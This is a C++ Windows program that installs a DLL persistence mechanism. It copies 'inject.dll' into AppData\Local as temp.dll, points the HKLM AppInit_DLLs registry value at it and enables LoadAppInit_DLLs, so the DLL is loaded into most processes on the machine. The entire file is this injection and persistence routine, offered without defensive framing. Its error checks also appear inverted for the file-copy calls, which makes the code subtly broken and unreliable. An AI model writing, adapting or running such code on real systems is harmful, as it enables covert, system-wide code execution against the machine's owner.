#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
#include <Shlobj.h> 
using namespace std;

void error(DWORD retval) {
	//Simple Wrapper for print errors
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}

bool checkError(DWORD retval) {
	//Wrapper for Checking errors and debugging them with debug builds
#ifdef _DEBUG
	error(retval);
#endif
	return retval != 0;
}

int main() {
	//HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows
	HKEY hkey;
	HKEY hkey_appinit;
	HKEY hkey_loadinit;
	LPCSTR s = "Environment";

	//Registry check
	long retval = RegOpenKeyExA(HKEY_CURRENT_USER, s, 0, KEY_ALL_ACCESS, &hkey);
	if (checkError(retval)) {
		return -1;
	}
	else {
		cout << "Opened key!" << endl;

		//Grab User home directory
		CHAR buf[MAX_PATH] = { 0 };
		char tempHomePath[MAX_PATH];
		long result = SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, tempHomePath);
		string full_path(tempHomePath);

		//Grab and open the location of the AppInit_dll registry
		LPCSTR appinit_reg = "Software\\Microsoft\\Windows NT\\CurrentVersion";
		retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, appinit_reg, 0, KEY_ALL_ACCESS, &hkey_appinit);
		if (checkError(retval)) {
			//Failed to open, bail
			return -1;
		}

		//Get the current directoy and setup the string for the new name
		CHAR cwd[MAX_PATH];
		GetCurrentDirectoryA(MAX_PATH, cwd);
		string s_cwd(cwd);
		string new_file(cwd);
		string reg_file = "";
		s_cwd.append("\\inject.dll");
		new_file.append("\\temp.dll");
		full_path.append("\\AppData\\Local\\temp.dll");
		reg_file.append(full_path);
		
#ifdef _DEBUG
		cout << s_cwd << endl;
		cout << new_file << endl;
		cout << full_path << endl;
#endif
		//Copy the new dll and give it a new name
		retval = CopyFileA(s_cwd.c_str(), new_file.c_str(), FALSE);
		if (checkError(retval)) {
			//Failed to Copy
			return -1;
		}
		//Move the dll into Appdata/local
		retval = MoveFileExA(new_file.c_str(), full_path.c_str(), MOVEFILE_COPY_ALLOWED);
		if (checkError(retval)) {
			return -1;
		}
		//Modify the registry of AppInit_Dlls to point to the new dll
		retval = RegSetKeyValueA(hkey_appinit, "Windows", "AppInit_DLLs", REG_SZ, reg_file.c_str(), reg_file.length());
#ifdef _DEBUG
		error(retval);
#endif 
		//HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs
		retval = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_ALL_ACCESS, &hkey_loadinit);
		if (checkError(retval)) {
			return -1;
		}

		//Modify the LoadAppInit_Dlls to 1, this allows appinit to function
		DWORD value = 1;
		retval = RegSetKeyValueA(hkey_appinit, "Windows", "LoadAppInit_DLLs", REG_DWORD, &value, sizeof(value));
		if (checkError(retval)) {
			//Failed to modify
			return -1;
		}

		//Cleanup
		RegCloseKey(hkey);
		RegCloseKey(hkey_appinit);
		RegCloseKey(hkey_loadinit);


	}
	
}